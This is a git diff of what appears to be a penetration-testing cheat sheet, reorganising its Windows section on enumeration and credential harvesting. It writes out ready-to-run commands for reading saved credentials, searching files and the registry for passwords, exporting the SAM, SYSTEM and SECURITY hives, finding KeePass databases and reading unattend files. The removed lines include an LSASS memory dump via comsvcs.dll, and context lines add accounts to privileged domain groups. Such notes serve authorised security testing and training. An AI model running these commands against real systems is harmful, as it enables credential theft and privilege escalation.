@@ -4093,11 +4093,11 @@ rm ./'--checkpoint-action=exec=python script.sh'
 
 #### Microsoft Windows
 
-##### Basic Windows Enumeration
+##### Basic Microsoft Windows Enumeration
 
 ```c
-systeminfo
 whoami /all
+systeminfo
 net user
 net user /domain
 net user <USERNAME>
@@ -4107,10 +4107,6 @@ sc query
 sc qc <SERVICE>
 netsh firewall show state
 schtasks /query /fo LIST /v
-schtasks /query /v /fo LIST | findstr <USERNAME>
-findstr /si password *.xml *.ini *.txt
-dir /s *pass* == *cred* == *vnc* == *.config*
-accesschk.exe -uws "Everyone" "C:\Program Files\"
 wmic qfe get Caption,Description,HotFixID,InstalledOn
 driverquery.exe /v /fo csv | ConvertFrom-CSV | Select-Object 'Display Name', 'Start Mode', Path
 ```
@@ -4171,6 +4167,104 @@ C:\Windows\SysWOW64\Tasks\Microsoft\Windows\PLA\System
 net user <USERNAME> <PASSWORD> /add /domain
 net group "Exchange Windows Permissions" /add <USERNAME>
 net localgroup "Remote Management Users" /add <USERNAME>
+```
+
+##### Credential Harvesting
+
+###### Quick Wins
+
+> https://twitter.com/NinjaParanoid/status/1516442028963659777?t=g7ed0vt6ER8nS75qd-g0sQ&s=09
+
+> https://www.nirsoft.net/utils/credentials_file_view.html
+
+```c
+cmdkey /list
+rundll32 keymgr.dll, KRShowKeyMgr
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+reg query HKEY_CURRENT_USER\Software\<USERNAME>\PuTTY\Sessions\ /f "Proxy" /s
+type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
+```
+
+###### Search for Passwords
+
+```c
+findstr /si password *.xml *.ini *.txt
+dir .s *pass* == *.config
+dir /s *pass* == *cred* == *vnc* == *.config*
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
+```
+
+###### PowerShell History
+
+```c
+type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
+```
+
+###### Saved Windows Credentials
+
+```c
+cmdkey /list
+runas /savecred /user:<USERNAME> cmd.exe
+```
+
+###### Winlogon Credentials
+
+```c
+reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
+```
+
+###### Local Administrator Password Solution (LAPS)
+
+```c
+Get-ADComputer <RHOST> -property 'ms-mcs-admpwd'
+```
+
+###### Search the Registry for Passwords
+
+```c
+reg query HKLM /f password /t REG_SZ /s
+reg query HKCU /f password /t REG_SZ /s
+```
+
+###### Dumping Credentials
+
+```c
+reg save hklm\system system
+reg save hklm\sam sam
+reg.exe save hklm\sam c:\temp\sam.save
+reg.exe save hklm\security c:\temp\security.save
+reg.exe save hklm\system c:\temp\system.save
+```
+
+###### Find KeePass Databases
+
+```c
+Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
+```
+
+###### Internet Information Service (IIS)
+
+```c
+C:\Windows\System32\inetsrv>appcmd.exe list apppool /@:*
+type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
+```
+
+###### PuTTY
+
+```c
+reg query HKEY_CURRENT_USER\Software\<USERNAME>\PuTTY\Sessions\ /f "Proxy" /s
+```
+
+###### Unattended Windows Installations
+
+```c
+C:\Unattend.xml
+C:\Windows\Panther\Unattend.xml
+C:\Windows\Panther\Unattend\Unattend.xml
+C:\Windows\system32\sysprep.inf
+C:\Windows\system32\sysprep\sysprep.xml
 ```
 
 ##### Enable Remote Desktop (RDP)
@@ -4347,110 +4441,6 @@ req query <REGISTRY_KEY>
 
 ```c
 reg add <REGISTRY_KEY> /v <VALUE_TO_MODIFY> /t REG_EXPAND_SZ /d C:\PATH\TO\FILE\<FILE>.exe /f
-```
-
-##### Searching for Credentials
-
-###### Quick Wins
-
-> https://twitter.com/NinjaParanoid/status/1516442028963659777?t=g7ed0vt6ER8nS75qd-g0sQ&s=09
-
-> https://www.nirsoft.net/utils/credentials_file_view.html
-
-```c
-cmdkey /list
-rundll32 keymgr.dll, KRShowKeyMgr
-reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
-reg query HKEY_CURRENT_USER\Software\<USERNAME>\PuTTY\Sessions\ /f "Proxy" /s
-type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
-```
-
-###### Search for Passwords
-
-```c
-dir .s *pass* == *.config
-findstr /si password *.xml *.ini *.txt
-Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
-Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
-Get-ChildItem -Path C:\Users\<USERNAME>\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction
-```
-
-###### PowerShell History
-
-```c
-type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
-```
-
-###### Saved Windows Credentials
-
-```c
-cmdkey /list
-runas /savecred /user:<USERNAME> cmd.exe
-```
-
-###### Winlogon Credentials
-
-```c
-reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
-```
-
-###### Local Administrator Password Solution (LAPS)
-
-```c
-Get-ADComputer <RHOST> -property 'ms-mcs-admpwd'
-```
-
-###### Search the Registry for Passwords
-
-```c
-reg query HKLM /f password /t REG_SZ /s
-reg query HKCU /f password /t REG_SZ /s
-```
-
-###### Dumping Credentials
-
-```c
-reg save hklm\system system
-reg save hklm\sam sam
-reg.exe save hklm\sam c:\temp\sam.save
-reg.exe save hklm\security c:\temp\security.save
-reg.exe save hklm\system c:\temp\system.save
-```
-
-###### Find KeePass Databases
-
-```c
-Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
-```
-
-###### Internet Information Service (IIS)
-
-```c
-C:\Windows\System32\inetsrv>appcmd.exe list apppool /@:*
-type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
-```
-
-###### PuTTY
-
-```c
-reg query HKEY_CURRENT_USER\Software\<USERNAME>\PuTTY\Sessions\ /f "Proxy" /s
-```
-
-###### Lsass
-
-```c
-tasklist
-rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump 688 C:\Users\Administrator\Documents\lsass.dmp full
-```
-
-###### Unattended Windows Installations
-
-```c
-C:\Unattend.xml
-C:\Windows\Panther\Unattend.xml
-C:\Windows\Panther\Unattend\Unattend.xml
-C:\Windows\system32\sysprep.inf
-C:\Windows\system32\sysprep\sysprep.xml
 ```
 
 ##### Insecure Service Permissions
